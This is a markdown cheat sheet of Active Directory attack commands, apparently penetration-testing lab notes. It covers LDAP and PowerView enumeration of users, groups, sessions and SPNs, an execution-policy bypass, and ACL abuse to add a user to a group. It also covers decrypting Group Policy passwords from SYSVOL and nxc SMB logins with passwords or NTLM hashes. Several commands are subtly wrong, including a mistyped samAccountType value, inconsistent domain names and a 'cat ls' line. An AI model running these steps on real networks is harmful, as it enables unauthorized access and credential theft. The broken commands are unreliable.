# net command
domain users
```
net user /domain
```

specific user in the domain
```
net user USERNAME /domain
```

groups in the domain
```
net group /domain
```

specific group in the domain
```
net group "Sales Department" /domain
```

# powershell scripts
### preparation command
```
powershell -ep bypass
```

### domain object searcher
samaccounttype = 805306368  (domain users)
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$directory = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($directory)
$dirsearcher.filter = "samAccountType=805306368"
$result = $dirsearcher.FindAll()


Foreach($obj in $result)
{
        Foreach($prop in $obj.Properties)
        {
                $prop
        }
        Write-Host "--------------------------------------"
}
```

samaccounttype = 268435456
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"

$directory = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($directory)
$dirsearcher.filter = "samAccountType=268435456"
$result = $dirsearcher.FindAll()


Foreach($obj in $result)
{
        Foreach($prop in $obj.Properties)
        {
                $prop
        }
        Write-Host "--------------------------------------"
}
```


### LDAPSearch
function.ps1
```
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()

}
```

import LDAPSearch
```
import-module .\function.ps1
```

user search
```
LDAPSearch -LDAPQuery "(SamAccountType=8053063638)"
```

groups search
```
LDAPSearch -LDAPQuery "(objectclass=group)"
```

iterate through the objects in $group variable
```
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {$group.properties | select {$_.cn},{$_.member}}
```

printing the member attribute on the specific group object
```
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=GROUPNAME))"
$group.properties.member
```


# PowerView
download
```
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
```

```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
powershell -ep bypass
```

Import
```
Import-Module .\PowerView.ps1
```

# Enumerating Users and Groups

domain information
```
Get-NetDomain
```

Users in the domain
```
Get-NetUser
```

using select statement
```
Get-NetUser | select cn
```

pwdlastset and lastlogon
```
Get-NetUser | select cn,pwdlastset,lastlogon
```

inspecting a user full details
```
Get-NetUser "USERNAME" | select pwdlastset,usncreated,lastlogoff,badpwdcount,name,samaccounttype,samaccountname,whenchanged,objectsid,lastlogon,objectclass,codepage,cn,usnchanged,primarygroupid,logoncount,countrycode,dscorepropagationdata,useraccountcontrol,accountexpires,distinguishedname,whencreated,badpasswordtime,instancetype,objectguid,objectcategory
```

goups in the domain
```
Get-NetGroup | select cn
```

specific domain group member
```
Get-NetGroup "GROUPNAME" | select member
```

# Enumerating Operating Systems
domain computers
```
Get-NetComputer
```

OS and hostname
```
Get-NetComputer | select operatingsystem,dnshostname
```

# Permissions and Logged On
**PowerView only works on windows 10 builds earlier than 1709**
scanning domain to find local administrative privilleges
```
Find-LocalAdminAccess
```

checking loggeon users
```
Get-NetSession -ComputerName NAME -Verbose
```

**PsLoggedOn**
download
```
https://download.sysinternals.com/files/PSTools.zip
```

to see user logons
```
.\PsLoggedon.exe \\client74
```

enumration scripts
```
powershell -ep bypass
Import-Module .\PowerView.ps1
$computers = Get-NetComputer | select -ExpandProperty dnshostname
foreach ($computer in $computers) {
	Write-Host "==== Enumerating logons on $computer ===="
	& "Path to PsLoggedOn.exe" \\$computer
	Write-Host "-----------------------------------------"
}
```

# SPN Enumeration
**setspn**
a user account only
```
setspn -L iis_service
```

**PowerView**
enumerate all the accounts
```
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

resolving the name
```
nslookup HOSTNAME
```

# Object Permissions
AD permission types
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

user ACL
```
Get-ObjectAcl -Identity USERNAME
```

group ACL
```
Get-ObjectACL -Identity "GROUPNAME"
```

convert sid to name
```
Convert-SidToName SID
```

List GenericAll ACLs and resolve SIDs
```
$sids = Get-ObjectAcl -Identity "GROUPNAME" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object -ExpandProperty SecurityIdentifier

$sids | ForEach-Object{
	[PSCustomObject]@{
		SID = $_
		NAME = Convert-SidToName $_
	}
}
```

if the current user has GenericAll ACLs on specific group, they can add to that group
```
net group "GROUPNAME" USERNAME /add /domain
```

# Domain Shares
find domain share by powerview
```
Find-DomainShare
```

listing contents of the SYSVOL share
```
ls \\dc1.crop.com\sysvol\corp.com

default SYSVOL folder is mapped to %SystemRoot%\SYSVOL\Sysvol\domain-name
```


checking old policy backup file
```
ls \\dc1.crop.com\sysvol\corp.com\Policies
cat ls \\dc1.crop.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

gpp-decrypt to decrypt the password
```
gpp-decrypt "CPASSWORD"
```

# Find Local Admin Access
## PowerView
Checks which hosts in the domain the current user has local administrator access to.
```
Find-LocalAdminAccess
```

To specify target hosts
```
Find-LocalAdminAccess -ComputerName (Get-Content .\hosts.txt)
```
## nxc
Similar checks using `nxc smb`
use passwords
```
nxc smb ip.txt -u USER -p PASS --continue-on-success
```

use hashes
```
nxc smb 192.168.x.x -u USER -H 'NTLM' --continue-on-success 
```
# Find Vulnerable GPO
 check for the permissions our current user have over the GPONAME
```
import-module .\PowerView.ps1
Get-NetGPO | select displayname
Get-GPO -Name "GPONAME"
Get-GPPermission -Guid ID -TargetType User -TargetName USERNAME
```

ref:
```
https://medium.com/@raphaeltzy13/group-policy-object-gpo-abuse-windows-active-directory-privilege-escalation-51d8519a13d7
https://bit-bandits.com/sharpgpoabuse.html
```